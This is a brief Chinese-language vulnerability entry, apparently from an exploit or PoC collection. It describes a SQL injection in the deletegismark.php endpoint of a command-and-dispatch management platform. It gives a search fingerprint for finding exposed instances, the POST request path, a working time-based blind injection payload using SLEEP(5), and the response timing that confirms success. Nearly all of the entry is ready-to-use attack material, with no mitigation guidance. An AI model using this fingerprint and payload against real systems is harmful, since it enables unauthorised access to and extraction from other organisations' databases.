# 指挥调度管理平台deletegismark.php存在SQL注入漏洞

指挥调度管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="app/structure/departments.php"`
- **请求**：`POST /api/client/deletegismark.php HTTP/1.1`

**Payload**
```
acc=21'%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP(5)))FIjE)--+-&id=22222
```
- **响应特征**：200 response time > 5s